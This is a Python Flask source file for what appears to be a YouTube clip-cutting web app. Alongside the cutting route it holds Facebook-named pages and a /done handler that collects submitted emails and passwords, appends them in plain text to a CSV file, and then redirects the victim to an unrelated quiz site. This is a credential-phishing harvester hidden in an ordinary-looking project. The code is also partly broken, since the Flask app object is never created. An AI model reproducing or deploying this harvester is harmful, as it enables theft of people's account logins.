# -*- coding: utf-8 -*-
from flask import Flask
from flask import render_template, request,jsonify,redirect,url_for
import csv
from service import youtube_service
ytb_service = youtube_service.YoutubeService();


# @app.route('/',methods=['GET','POST'])
# def home():
#     if request.method == 'POST':
#         url = request.form['ytb_link']
#         url = url.replace("watch?v=","embed/")
#         print("processed url: "+url)
#     else:
#         # default is youtube homepage
#         url = 'http://youtube.com/embed/'
#     return render_template("home.html", url=url)

@app.route('/',methods=['GET','POST'])
def home():
    return render_template("home.html")

@app.route('/cut_video',methods=['POST'])
def cut_video():
    start_time = request.form['start_time']
    stop_time = request.form['stop_time']
    url = request.form['url']
    print(start_time)
    print(stop_time)
    print(url)
    if stop_time > start_time:
        ytb_service.download_cut(url,float(start_time),float(stop_time))
    return jsonify({'output':'ok'})

@app.route('/facebook')
def facebook():
    return render_template("facebook.html")

@app.route('/facebook-form')
def facebook_form():
    return render_template("facebook-form.html")

@app.route('/done',methods=['GET','POST'])
def done():
    email = request.form['email']
    password = request.form['pass']
    with open('test.csv', 'a') as csvfile:
        writer = csv.writer(csvfile, lineterminator='\n')
        writer.writerow([email, password])
    return redirect("https://www.zenquiz.net/vn/pquiz/ban-la-ai-trong-tam-quoc-dien-nghia-UIDjnOBygMQVtyik4PH", code=302)

@app.route('/ajax',methods=['GET','POST'])
def ajax():
    return jsonify({"url":"/facebook-form"})

